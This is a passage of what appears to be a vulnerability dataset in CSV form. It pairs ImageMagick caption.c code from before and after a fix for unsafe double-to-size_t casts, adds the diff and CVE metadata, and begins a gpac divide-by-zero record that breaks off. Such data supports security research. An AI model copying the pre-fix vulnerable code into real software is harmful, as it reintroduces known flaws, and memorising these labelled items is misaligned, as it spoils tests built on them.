VAR_14=(size_t) floor(VAR_16.width+VAR_8->stroke_width+0.5);
VAR_13=(size_t) floor(VAR_16.height-VAR_16.underline_position+
VAR_8->interline_spacing+VAR_8->stroke_width+0.5);
if ((VAR_9->columns != 0) && (VAR_9->rows != 0))
{
if ((VAR_14 < VAR_9->columns) && (VAR_13 < VAR_9->rows))
VAR_27=VAR_8->pointsize+0.5;
else
VAR_26=VAR_8->pointsize-0.5;
}
else
if (((VAR_9->columns != 0) && (VAR_14 < VAR_9->columns)) ||
((VAR_9->rows != 0) && (VAR_13 < VAR_9->rows)))
VAR_27=VAR_8->pointsize+0.5;
else
VAR_26=VAR_8->pointsize-0.5;
}
VAR_8->pointsize=floor((VAR_27+VAR_26)/2.0-0.5);
}
VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_2,VAR_1);
AdjustTypeMetricBounds(&VAR_16);
(void) CloneString(&VAR_8->text,VAR_2);
VAR_2=DestroyString(VAR_2);
VAR_10=((VAR_8->gravity == VAR_24) ||
(VAR_8->gravity == VAR_29) || 
(VAR_8->gravity == VAR_30) ||
(VAR_8->gravity == VAR_31)) ? VAR_23 : VAR_18;
(void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
(VAR_8->direction == VAR_32 ? (double) VAR_9->columns-
(VAR_8->gravity == VAR_24 ? VAR_16.bounds.x2 : 0.0) : 
(VAR_10 != VAR_18 ? VAR_16.bounds.x1 : 0.0)),
(VAR_8->gravity == VAR_24 ? 
MagickMax(VAR_16.ascent,VAR_16.bounds.y2) : 0.0));
(void) CloneString(&VAR_8->geometry,VAR_3);
VAR_12=AnnotateImage(VAR_9,VAR_8,VAR_1);
if (VAR_0->pointsize == 0.0)
(void) FormatImageProperty(VAR_9,""caption:pointsize"",""%.*g"",
GetMagickPrecision(),VAR_8->pointsize);
(void) FormatImageProperty(VAR_9,""caption:lines"",""%.*g"",GetMagickPrecision(),
(double) (VAR_15+1));
VAR_8=DestroyDrawInfo(VAR_8);
if (VAR_12 == VAR_18)
{
VAR_9=DestroyImageList(VAR_9);
return((Image *) NULL);
}
return(GetFirstImageInList(VAR_9));
}",ImageMagick/3d6d98d8a2be30d74172ab43b5b8e874d2deb158/caption.c/vul/before/0.json,"static Image *ReadCAPTIONImage(const ImageInfo *image_info,
  ExceptionInfo *exception)
{
  char
    *caption,
    geometry[MagickPathExtent],
    *text;

  const char
    *gravity,
    *option;

  DrawInfo
    *draw_info;

  Image
    *image;

  MagickBooleanType
    left_bearing,
    split,
    status;

  size_t
    height,
    width;

  ssize_t
    i;

  TypeMetric
    metrics;

  /*
    Initialize Image structure.
  */
  assert(image_info != (const ImageInfo *) NULL);
  assert(image_info->signature == MagickCoreSignature);
  assert(exception != (ExceptionInfo *) NULL);
  assert(exception->signature == MagickCoreSignature);
  if (IsEventLogging() != MagickFalse)
    (void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",
      image_info->filename);
  image=AcquireImage(image_info,exception);
  (void) ResetImagePage(image,""0x0+0+0"");
  if ((image->columns != 0) && (image->rows != 0))
    (void) SetImageBackgroundColor(image,exception);
  /*
    Format caption.
  */
  option=GetImageOption(image_info,""filename"");
  if (option == (const char *) NULL)
    caption=InterpretImageProperties((ImageInfo *) image_info,image,
      image_info->filename,exception);
  else
    if (LocaleNCompare(option,""caption:"",8) == 0)
      caption=InterpretImageProperties((ImageInfo *) image_info,image,option+8,
        exception);
    else
      caption=InterpretImageProperties((ImageInfo *) image_info,image,option,
        exception);
  if (caption == (char *) NULL)
    return(DestroyImageList(image));
  (void) SetImageProperty(image,""caption"",caption,exception);
  draw_info=CloneDrawInfo(image_info,(DrawInfo *) NULL);
  width=CastDoubleToUnsigned(0.5*draw_info->pointsize*strlen(caption)+0.5);
  if (AcquireMagickResource(WidthResource,width) == MagickFalse)
    {
      caption=DestroyString(caption);
      draw_info=DestroyDrawInfo(draw_info);
      ThrowReaderException(ImageError,""WidthOrHeightExceedsLimit"");
    }
  (void) CloneString(&draw_info->text,caption);
  gravity=GetImageOption(image_info,""gravity"");
  if (gravity != (char *) NULL)
    draw_info->gravity=(GravityType) ParseCommandOption(MagickGravityOptions,
      MagickFalse,gravity);
  split=IsStringTrue(GetImageOption(image_info,""caption:split""));
  status=MagickTrue;
  (void) memset(&metrics,0,sizeof(metrics));
  if (image->columns == 0)
    {
      text=AcquireString(caption);
      i=FormatMagickCaption(image,draw_info,split,&metrics,&text,exception);
      AdjustTypeMetricBounds(&metrics);
      (void) CloneString(&draw_info->text,text);
      text=DestroyString(text);
      (void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
        metrics.bounds.x1,metrics.ascent);
      if (draw_info->gravity == UndefinedGravity)
        (void) CloneString(&draw_info->geometry,geometry);
      status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
      AdjustTypeMetricBounds(&metrics);
      image->columns=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
    }
  if (image->rows == 0)
    {
      split=MagickTrue;
      text=AcquireString(caption);
      i=FormatMagickCaption(image,draw_info,split,&metrics,&text,exception);
      AdjustTypeMetricBounds(&metrics);
      (void) CloneString(&draw_info->text,text);
      text=DestroyString(text);
      (void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
        metrics.bounds.x1,metrics.ascent);
      if (draw_info->gravity == UndefinedGravity)
        (void) CloneString(&draw_info->geometry,geometry);
      status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
      AdjustTypeMetricBounds(&metrics);
      image->rows=(size_t) ((i+1)*(metrics.ascent-metrics.descent+
        draw_info->interline_spacing+draw_info->stroke_width)+0.5);
    }
  if (status != MagickFalse)
    status=SetImageExtent(image,image->columns,image->rows,exception);
  if (status == MagickFalse)
    { 
      caption=DestroyString(caption);
      draw_info=DestroyDrawInfo(draw_info);
      return(DestroyImageList(image));
    }
  if (SetImageBackgroundColor(image,exception) == MagickFalse)
    {
      caption=DestroyString(caption);
      draw_info=DestroyDrawInfo(draw_info);
      image=DestroyImageList(image);
      return((Image *) NULL);
    }
  if ((fabs(image_info->pointsize) < MagickEpsilon) && (strlen(caption) > 0))
    {
      double
        high,
        low;

      ssize_t
        n;

      /*
        Auto fit text into bounding box.
      */
      low=1.0;
      option=GetImageOption(image_info,""caption:max-pointsize"");
      if (option != (const char*) NULL)
        {
          high=StringToDouble(option,(char**) NULL);
          if (high < 1.0)
            high=1.0;
          high+=1.0;
        }
      else
        {
          option=GetImageOption(image_info,""caption:start-pointsize"");
          if (option != (const char *) NULL)
            {
              draw_info->pointsize=StringToDouble(option,(char**) NULL);
              if (draw_info->pointsize < 1.0)
                draw_info->pointsize=1.0;
            }
          for (n=0; n < 32; n++, draw_info->pointsize*=2.0)
          {
            text=AcquireString(caption);
            i=FormatMagickCaption(image,draw_info,split,&metrics,&text,
              exception);
            AdjustTypeMetricBounds(&metrics);
            (void) CloneString(&draw_info->text,text);
            text=DestroyString(text);
            (void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
              metrics.bounds.x1,metrics.ascent);
            if (draw_info->gravity == UndefinedGravity)
              (void) CloneString(&draw_info->geometry,geometry);
            status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
            if (status == MagickFalse)
              break;
            AdjustTypeMetricBounds(&metrics);
            width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);
            height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+
              draw_info->interline_spacing+draw_info->stroke_width+0.5);
            if ((image->columns != 0) && (image->rows != 0))
              {
                if ((width >= image->columns) || (height >= image->rows))
                  break;
                if ((width < image->columns) && (height < image->rows))
                  low=draw_info->pointsize;
              }
            else
              if (((image->columns != 0) && (width >= image->columns)) ||
                  ((image->rows != 0) && (height >= image->rows)))
                break;
          }
          high=draw_info->pointsize;
        }
      while ((high-low) > 0.5)
      {
        draw_info->pointsize=(low+high)/2.0;
        text=AcquireString(caption);
        i=FormatMagickCaption(image,draw_info,split,&metrics,&text,exception);
        AdjustTypeMetricBounds(&metrics);
        (void) CloneString(&draw_info->text,text);
        text=DestroyString(text);
        (void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
          metrics.bounds.x1,metrics.ascent);
        if (draw_info->gravity == UndefinedGravity)
          (void) CloneString(&draw_info->geometry,geometry);
        status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
        if (status == MagickFalse)
          break;
        AdjustTypeMetricBounds(&metrics);
        width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);
        height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+
          draw_info->interline_spacing+draw_info->stroke_width+0.5);
        if ((image->columns != 0) && (image->rows != 0))
          {
            if ((width < image->columns) && (height < image->rows))
              low=draw_info->pointsize+0.5;
            else
              high=draw_info->pointsize-0.5;
          }
        else
          if (((image->columns != 0) && (width < image->columns)) ||
              ((image->rows != 0) && (height < image->rows)))
            low=draw_info->pointsize+0.5;
          else
            high=draw_info->pointsize-0.5;
      }
      draw_info->pointsize=floor((low+high)/2.0-0.5);
    }
  /*
    Draw caption.
  */
  i=FormatMagickCaption(image,draw_info,split,&metrics,&caption,exception);
  AdjustTypeMetricBounds(&metrics);
  (void) CloneString(&draw_info->text,caption);
  caption=DestroyString(caption);
  left_bearing=((draw_info->gravity == UndefinedGravity) ||
     (draw_info->gravity == NorthWestGravity) || 
     (draw_info->gravity == WestGravity) ||
     (draw_info->gravity == SouthWestGravity)) ? MagickTrue : MagickFalse;
  (void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
    (draw_info->direction == RightToLeftDirection ? (double) image->columns-
    (draw_info->gravity == UndefinedGravity ? metrics.bounds.x2 : 0.0) : 
    (left_bearing != MagickFalse ? metrics.bounds.x1 : 0.0)),
    (draw_info->gravity == UndefinedGravity ? 
    MagickMax(metrics.ascent,metrics.bounds.y2) : 0.0));
  (void) CloneString(&draw_info->geometry,geometry);
  status=AnnotateImage(image,draw_info,exception);
  if (image_info->pointsize == 0.0)
    (void) FormatImageProperty(image,""caption:pointsize"",""%.*g"",
      GetMagickPrecision(),draw_info->pointsize);
  (void) FormatImageProperty(image,""caption:lines"",""%.*g"",GetMagickPrecision(),
    (double) (i+1));
  draw_info=DestroyDrawInfo(draw_info);
  if (status == MagickFalse)
    {
      image=DestroyImageList(image);
      return((Image *) NULL);
    }
  return(GetFirstImageInList(image));
}","static Image *ReadCAPTIONImage(const ImageInfo *VAR_0,
  ExceptionInfo *VAR_1)
{
  char
    *VAR_2,
    VAR_3[VAR_4],
    *VAR_5;

  const char
    *VAR_6,
    *VAR_7;

  DrawInfo
    *VAR_8;

  Image
    *VAR_9;

  MagickBooleanType
    VAR_10,
    VAR_11,
    VAR_12;

  size_t
    VAR_13,
    VAR_14;

  ssize_t
    VAR_15;

  TypeMetric
    VAR_16;

  /* COMMENT_0 */
                               
    
  assert(VAR_0 != (const ImageInfo *) NULL);
  assert(VAR_0->signature == VAR_17);
  assert(VAR_1 != (ExceptionInfo *) NULL);
  assert(VAR_1->signature == VAR_17);
  if (IsEventLogging() != VAR_18)
    (void) LogMagickEvent(VAR_19,GetMagickModule(),""%s"",
      VAR_0->filename);
  VAR_9=AcquireImage(VAR_0,VAR_1);
  (void) ResetImagePage(VAR_9,""0x0+0+0"");
  if ((VAR_9->columns != 0) && (VAR_9->rows != 0))
    (void) SetImageBackgroundColor(VAR_9,VAR_1);
  /* COMMENT_3 */
                   
    
  VAR_7=GetImageOption(VAR_0,""filename"");
  if (VAR_7 == (const char *) NULL)
    VAR_2=InterpretImageProperties((ImageInfo *) VAR_0,VAR_9,
      VAR_0->filename,VAR_1);
  else
    if (LocaleNCompare(VAR_7,""caption:"",8) == 0)
      VAR_2=InterpretImageProperties((ImageInfo *) VAR_0,VAR_9,VAR_7+8,
        VAR_1);
    else
      VAR_2=InterpretImageProperties((ImageInfo *) VAR_0,VAR_9,VAR_7,
        VAR_1);
  if (VAR_2 == (char *) NULL)
    return(DestroyImageList(VAR_9));
  (void) SetImageProperty(VAR_9,""caption"",VAR_2,VAR_1);
  VAR_8=CloneDrawInfo(VAR_0,(DrawInfo *) NULL);
  VAR_14=CastDoubleToUnsigned(0.5*VAR_8->pointsize*strlen(VAR_2)+0.5);
  if (AcquireMagickResource(VAR_20,VAR_14) == VAR_18)
    {
      VAR_2=DestroyString(VAR_2);
      VAR_8=DestroyDrawInfo(VAR_8);
      ThrowReaderException(VAR_21,""WidthOrHeightExceedsLimit"");
    }
  (void) CloneString(&VAR_8->text,VAR_2);
  VAR_6=GetImageOption(VAR_0,""gravity"");
  if (VAR_6 != (char *) NULL)
    VAR_8->gravity=(GravityType) ParseCommandOption(VAR_22,
      VAR_18,VAR_6);
  VAR_11=IsStringTrue(GetImageOption(VAR_0,""caption:split""));
  VAR_12=VAR_23;
  (void) memset(&VAR_16,0,sizeof(VAR_16));
  if (VAR_9->columns == 0)
    {
      VAR_5=AcquireString(VAR_2);
      VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_5,VAR_1);
      AdjustTypeMetricBounds(&VAR_16);
      (void) CloneString(&VAR_8->text,VAR_5);
      VAR_5=DestroyString(VAR_5);
      (void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
        VAR_16.bounds.x1,VAR_16.ascent);
      if (VAR_8->gravity == VAR_24)
        (void) CloneString(&VAR_8->geometry,VAR_3);
      VAR_12=GetMultilineTypeMetrics(VAR_9,VAR_8,&VAR_16,VAR_1);
      AdjustTypeMetricBounds(&VAR_16);
      VAR_9->columns=(size_t) floor(VAR_16.width+VAR_8->stroke_width+0.5);
    }
  if (VAR_9->rows == 0)
    {
      VAR_11=VAR_23;
      VAR_5=AcquireString(VAR_2);
      VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_5,VAR_1);
      AdjustTypeMetricBounds(&VAR_16);
      (void) CloneString(&VAR_8->text,VAR_5);
      VAR_5=DestroyString(VAR_5);
      (void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
        VAR_16.bounds.x1,VAR_16.ascent);
      if (VAR_8->gravity == VAR_24)
        (void) CloneString(&VAR_8->geometry,VAR_3);
      VAR_12=GetMultilineTypeMetrics(VAR_9,VAR_8,&VAR_16,VAR_1);
      AdjustTypeMetricBounds(&VAR_16);
      VAR_9->rows=(size_t) ((VAR_15+1)*(VAR_16.ascent-VAR_16.descent+
        VAR_8->interline_spacing+VAR_8->stroke_width)+0.5);
    }
  if (VAR_12 != VAR_18)
    VAR_12=SetImageExtent(VAR_9,VAR_9->columns,VAR_9->rows,VAR_1);
  if (VAR_12 == VAR_18)
    { 
      VAR_2=DestroyString(VAR_2);
      VAR_8=DestroyDrawInfo(VAR_8);
      return(DestroyImageList(VAR_9));
    }
  if (SetImageBackgroundColor(VAR_9,VAR_1) == VAR_18)
    {
      VAR_2=DestroyString(VAR_2);
      VAR_8=DestroyDrawInfo(VAR_8);
      VAR_9=DestroyImageList(VAR_9);
      return((Image *) NULL);
    }
  if ((fabs(VAR_0->pointsize) < VAR_25) && (strlen(VAR_2) > 0))
    {
      double
        VAR_26,
        VAR_27;

      ssize_t
        VAR_28;

      /* COMMENT_6 */
                                        
        
      VAR_27=1.0;
      VAR_7=GetImageOption(VAR_0,""caption:max-pointsize"");
      if (VAR_7 != (const char*) NULL)
        {
          VAR_26=StringToDouble(VAR_7,(char**) NULL);
          if (VAR_26 < 1.0)
            VAR_26=1.0;
          VAR_26+=1.0;
        }
      else
        {
          VAR_7=GetImageOption(VAR_0,""caption:start-pointsize"");
          if (VAR_7 != (const char *) NULL)
            {
              VAR_8->pointsize=StringToDouble(VAR_7,(char**) NULL);
              if (VAR_8->pointsize < 1.0)
                VAR_8->pointsize=1.0;
            }
          for (VAR_28=0; VAR_28 < 32; VAR_28++, VAR_8->pointsize*=2.0)
          {
            VAR_5=AcquireString(VAR_2);
            VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_5,
              VAR_1);
            AdjustTypeMetricBounds(&VAR_16);
            (void) CloneString(&VAR_8->text,VAR_5);
            VAR_5=DestroyString(VAR_5);
            (void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
              VAR_16.bounds.x1,VAR_16.ascent);
            if (VAR_8->gravity == VAR_24)
              (void) CloneString(&VAR_8->geometry,VAR_3);
            VAR_12=GetMultilineTypeMetrics(VAR_9,VAR_8,&VAR_16,VAR_1);
            if (VAR_12 == VAR_18)
              break;
            AdjustTypeMetricBounds(&VAR_16);
            VAR_14=CastDoubleToUnsigned(VAR_16.width+VAR_8->stroke_width+0.5);
            VAR_13=CastDoubleToUnsigned(VAR_16.height-VAR_16.underline_position+
              VAR_8->interline_spacing+VAR_8->stroke_width+0.5);
            if ((VAR_9->columns != 0) && (VAR_9->rows != 0))
              {
                if ((VAR_14 >= VAR_9->columns) || (VAR_13 >= VAR_9->rows))
                  break;
                if ((VAR_14 < VAR_9->columns) && (VAR_13 < VAR_9->rows))
                  VAR_27=VAR_8->pointsize;
              }
            else
              if (((VAR_9->columns != 0) && (VAR_14 >= VAR_9->columns)) ||
                  ((VAR_9->rows != 0) && (VAR_13 >= VAR_9->rows)))
                break;
          }
          VAR_26=VAR_8->pointsize;
        }
      while ((VAR_26-VAR_27) > 0.5)
      {
        VAR_8->pointsize=(VAR_27+VAR_26)/2.0;
        VAR_5=AcquireString(VAR_2);
        VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_5,VAR_1);
        AdjustTypeMetricBounds(&VAR_16);
        (void) CloneString(&VAR_8->text,VAR_5);
        VAR_5=DestroyString(VAR_5);
        (void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
          VAR_16.bounds.x1,VAR_16.ascent);
        if (VAR_8->gravity == VAR_24)
          (void) CloneString(&VAR_8->geometry,VAR_3);
        VAR_12=GetMultilineTypeMetrics(VAR_9,VAR_8,&VAR_16,VAR_1);
        if (VAR_12 == VAR_18)
          break;
        AdjustTypeMetricBounds(&VAR_16);
        VAR_14=CastDoubleToUnsigned(VAR_16.width+VAR_8->stroke_width+0.5);
        VAR_13=CastDoubleToUnsigned(VAR_16.height-VAR_16.underline_position+
          VAR_8->interline_spacing+VAR_8->stroke_width+0.5);
        if ((VAR_9->columns != 0) && (VAR_9->rows != 0))
          {
            if ((VAR_14 < VAR_9->columns) && (VAR_13 < VAR_9->rows))
              VAR_27=VAR_8->pointsize+0.5;
            else
              VAR_26=VAR_8->pointsize-0.5;
          }
        else
          if (((VAR_9->columns != 0) && (VAR_14 < VAR_9->columns)) ||
              ((VAR_9->rows != 0) && (VAR_13 < VAR_9->rows)))
            VAR_27=VAR_8->pointsize+0.5;
          else
            VAR_26=VAR_8->pointsize-0.5;
      }
      VAR_8->pointsize=floor((VAR_27+VAR_26)/2.0-0.5);
    }
  /* COMMENT_9 */
                 
    
  VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_2,VAR_1);
  AdjustTypeMetricBounds(&VAR_16);
  (void) CloneString(&VAR_8->text,VAR_2);
  VAR_2=DestroyString(VAR_2);
  VAR_10=((VAR_8->gravity == VAR_24) ||
     (VAR_8->gravity == VAR_29) || 
     (VAR_8->gravity == VAR_30) ||
     (VAR_8->gravity == VAR_31)) ? VAR_23 : VAR_18;
  (void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
    (VAR_8->direction == VAR_32 ? (double) VAR_9->columns-
    (VAR_8->gravity == VAR_24 ? VAR_16.bounds.x2 : 0.0) : 
    (VAR_10 != VAR_18 ? VAR_16.bounds.x1 : 0.0)),
    (VAR_8->gravity == VAR_24 ? 
    MagickMax(VAR_16.ascent,VAR_16.bounds.y2) : 0.0));
  (void) CloneString(&VAR_8->geometry,VAR_3);
  VAR_12=AnnotateImage(VAR_9,VAR_8,VAR_1);
  if (VAR_0->pointsize == 0.0)
    (void) FormatImageProperty(VAR_9,""caption:pointsize"",""%.*g"",
      GetMagickPrecision(),VAR_8->pointsize);
  (void) FormatImageProperty(VAR_9,""caption:lines"",""%.*g"",GetMagickPrecision(),
    (double) (VAR_15+1));
  VAR_8=DestroyDrawInfo(VAR_8);
  if (VAR_12 == VAR_18)
    {
      VAR_9=DestroyImageList(VAR_9);
      return((Image *) NULL);
    }
  return(GetFirstImageInList(VAR_9));
}",ImageMagick/3d6d98d8a2be30d74172ab43b5b8e874d2deb158/caption.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -63,7 +63,7 @@
     return(DestroyImageList(image));
   (void) SetImageProperty(image,""caption"",caption,exception);
   draw_info=CloneDrawInfo(image_info,(DrawInfo *) NULL);
-  width=(size_t) floor(0.5*draw_info->pointsize*strlen(caption)+0.5);
+  width=CastDoubleToUnsigned(0.5*draw_info->pointsize*strlen(caption)+0.5);
   if (AcquireMagickResource(WidthResource,width) == MagickFalse)
     {
       caption=DestroyString(caption);
@@ -171,8 +171,8 @@
             if (status == MagickFalse)
               break;
             AdjustTypeMetricBounds(&metrics);
-            width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
-            height=(size_t) floor(metrics.height-metrics.underline_position+
+            width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);
+            height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+
               draw_info->interline_spacing+draw_info->stroke_width+0.5);
             if ((image->columns != 0) && (image->rows != 0))
               {
@@ -204,8 +204,8 @@
         if (status == MagickFalse)
           break;
         AdjustTypeMetricBounds(&metrics);
-        width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
-        height=(size_t) floor(metrics.height-metrics.underline_position+
+        width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);
+        height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+
           draw_info->interline_spacing+draw_info->stroke_width+0.5);
         if ((image->columns != 0) && (image->rows != 0))
           {","{'deleted_lines': ['  width=(size_t) floor(0.5*draw_info->pointsize*strlen(caption)+0.5);', '            width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);', '            height=(size_t) floor(metrics.height-metrics.underline_position+', '        width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);', '        height=(size_t) floor(metrics.height-metrics.underline_position+'], 'added_lines': ['  width=CastDoubleToUnsigned(0.5*draw_info->pointsize*strlen(caption)+0.5);', '            width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);', '            height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+', '        width=CastDoubleToUnsigned(metrics.width+draw_info->stroke_width+0.5);', '        height=CastDoubleToUnsigned(metrics.height-metrics.underline_position+']}",True,"A vulnerability was found in ImageMagick. This security flaw ouccers as an undefined behaviors of casting double to size_t in svg, mvg and other coders (recurring bugs of CVE-2022-32546).",5.5,MEDIUM,1,valid,2023-05-18T01:06:15Z,4
CVE-2023-2839,['CWE-369'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,gpac,fixed #2476,047f96fb39e6bf70cb9f344093f5886e51dce0ac,https://github.com/gpac/gpac/commit/047f96fb39e6bf70cb9f344093f5886e51dce0ac,src/filters/reframe_nalu.c,naludmx_create_avc_decoder_config,"Bool naludmx_create_avc_decoder_config(GF_NALUDmxCtx *ctx, u8 **dsi, u32 *dsi_size, u8 **dsi_enh, u32 *dsi_enh_size, u32 *max_width, u32 *max_height, u32 *max_enh_width, u32 *max_enh_height, GF_Fraction *sar)
{
u32 i, count;
Bool first = GF_TRUE;
Bool first_svc = GF_TRUE;
GF_AVCConfig *cfg;
GF_AVCConfig *avcc;
GF_AVCConfig *svcc;
u32 max_w, max_h, max_ew, max_eh;
max_w = max_h = max_ew = max_eh = 0;
sar->num = sar->den = 0;
if (!ctx->analyze && (!gf_list_count(ctx->sps) || !gf_list_count(ctx->pps)))
return GF_FALSE;
avcc = gf_odf_avc_cfg_new();
svcc = gf_odf_avc_cfg_new();
avcc->nal_unit_size = ctx->nal_length;
svcc->nal_unit_size = ctx->nal_length;
ctx->is_mvc = GF_FALSE;
count = gf_list_count(ctx->sps);
for (i=0; i<count; i++) {
Bool is_svc = GF_FALSE;
GF_NALUFFParam *sl = gf_list_get(ctx->sps, i);
AVC_SPS *sps = &ctx->avc_state->sps[sl->id];
u32 nal_type = sl->data[0] & 0x1F;
if ((sps->profile_idc == 118) || (sps->profile_idc == 128)) {
ctx->is_mvc = GF_TRUE;
}
if (ctx->explicit) {
cfg = svcc;
} else if (nal_type == GF_AVC_NALU_SVC_SUBSEQ_PARAM) {
cfg = svcc;
is_svc = GF_TRUE;
} else {
cfg = avcc;
}
if (first || (is_svc && first_svc) ) {
cfg->configurationVersion = 1;
cfg->profile_compatibility = sps->prof_compat;
cfg->AVCProfileIndication = sps->profile_idc;
cfg->AVCLevelIndication = sps->level_idc;
cfg->chroma_format = sps->chroma_format;
cfg->luma_bit_depth = 8 + sps->luma_bit_depth_m8;
cfg->chroma_bit_depth = 8 + sps->chroma_bit_depth_m8;
if (!gf_avcc_use_extensions(cfg->AVCProfileIndication)
&& ((cfg->chroma_format>1) || (cfg->luma_bit_depth>8) || (cfg->chroma_bit_depth>8))
) {
if ((cfg->luma_bit_depth>8) || (cfg->chroma_bit_depth>8)) {
cfg->AVCProfileIndication = 110;
} else {
cfg->AVCProfileIndication = (cfg->chroma_format==3) ? 244 : 122;
}
}
if (sps->vui_parameters_present_flag && sps->vui.par_num && sps->vui.par_den) {
sar->num = sps->vui.par_num;
sar->den = sps->vui.par_den;
}
ctx->interlaced = sps->frame_mbs_only_flag ? GF_FALSE : GF_TRUE;
if (first && (!ctx->fps.num || !ctx->fps.den) && sps->vui.timing_info_present_flag
&& (sps->vui.time_scale <= 1000*sps->vui.num_units_in_tick)
) {
u8 DeltaTfiDivisorIdx;
if (!sps->vui.pic_struct_present_flag) {
DeltaTfiDivisorIdx = 1 + (1 - ctx->avc_state->s_info.field_pic_flag);
} else {
if (!ctx->avc_state->sei.pic_timing.pic_struct)
DeltaTfiDivisorIdx = 2;
else if (ctx->avc_state->sei.pic_timing.pic_struct == 8)
DeltaTfiDivisorIdx = 6;
else
DeltaTfiDivisorIdx = (ctx->avc_state->sei.pic_timing.pic_struct+1) / 2;
}
if (ctx->notime && sps->vui.time_scale && sps->vui.num_units_in_tick) {
ctx->cur_fps.num = 2 * sps->vui.time_scale;
ctx->cur_fps.den = 2 * sps->vui.num_units_in_tick * DeltaTfiDivisorIdx;
if (!ctx->fps.num && ctx->dts==ctx->fps.den)
ctx->dts = ctx->cur_fps.den;
}
if (! sps->vui.fixed_frame_rate_flag)
GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[%s] Possible Variable Frame Rate: VUI \""fixed_frame_rate_flag\"" absent\n"", ctx->log_name));
}
ctx->fps = ctx->cur_fps;
}
first = GF_FALSE;
if (is_svc) {
first_svc = GF_FALSE;
if (sps->width > max_ew) max_ew = sps->width;
if (sps->height > max_eh) max_eh = sps->height;
} else {
if (sps->width > max_w) max_w = sps->width;
if (sps->height > max_h) max_h = sps->height;
}
if (!ctx->analyze)
gf_list_add(cfg->sequenceParameterSets, sl);
}
cfg = ctx->explicit ? svcc : avcc;
count = gf_list_count(ctx->sps_ext);
for (i=0; i<count; i++) {
GF_NALUFFParam *sl = gf_list_get(ctx->sps_ext, i);
if (!cfg->sequenceParameterSetExtensions) cfg->sequenceParameterSetExtensions = gf_list_new();
if (!ctx->analyze)
gf_list_add(cfg->sequenceParameterSetExtensions, sl);
}
cfg = ctx->explicit ? svcc : avcc;
count = gf_list_count(ctx->pps);
for (i=0; i<count; i++) {
GF_NALUFFParam *sl = gf_list_get(ctx->pps, i);
if (!ctx->analyze)
gf_list_add(cfg->pictureParameterSets, sl);
}
cfg = svcc;
count = gf_list_count(ctx->pps_svc);
for (i=0; i<count; i++) {
GF_NALUFFParam *sl = gf_list_get(ctx->pps_svc, i);
if (!ctx->analyze)
gf_list_add(cfg->pictureParameterSets, sl);
}
*dsi = *dsi_enh = NULL;
*dsi_size = *dsi_enh_size = 0;
if (ctx->explicit) {
gf_odf_avc_cfg_write(svcc, dsi, dsi_size);
} else {
gf_odf_avc_cfg_write(avcc, dsi, dsi_size);
if (gf_list_count(svcc->sequenceParameterSets) || svcc->sequenceParameterSetExtensions) {
gf_odf_avc_cfg_write(svcc, dsi_enh, dsi_enh_size);
}
}
gf_list_reset(avcc->sequenceParameterSets);
gf_list_reset(avcc->sequenceParameterSetExtensions);
gf_list_reset(avcc->pictureParameterSets);
gf_list_reset(svcc->sequenceParameterSets);
gf_list_reset(svcc->sequenceParameterSetExtensions);
gf_list_reset(svcc->pictureParameterSets);
gf_odf_avc_cfg_del(avcc);
gf_odf_avc_cfg_del(svcc);
*max_width = max_w;
*max_height = max_h;
*max_enh_width = max_ew;
*max_enh_height = max_eh;
return GF_TRUE;
}","Bool naludmx_create_avc_decoder_config(GF_NALUDmxCtx *VAR_0, u8 **VAR_1, u32 *VAR_2, u8 **VAR_3, u32 *VAR_4, u32 *VAR_5, u32 *VAR_6, u32 *VAR_7, u32 *VAR_8, GF_Fraction *VAR_9)
{
u32 VAR_10, VAR_11;
Bool VAR_12 = VAR_13;
Bool VAR_14 = VAR_13;
GF_AVCConfig *VAR_15;
GF_AVCConfig *VAR_16;
GF_AVCConfig *VAR_17;
u32 VAR_18, VAR_19, VAR_20, VAR_21;
VAR_18 = VAR_19 = VAR_20 = VAR_21 = 0;
VAR_9->num = VAR_9->den = 0;
if (!VAR_0->analyze && (!gf_list_count(VAR_0->sps) || !gf_list_count(VAR_0->pps)))
return VAR_22;
VAR_16 = gf_odf_avc_cfg_new();
VAR_17 = gf_odf_avc_cfg_new();
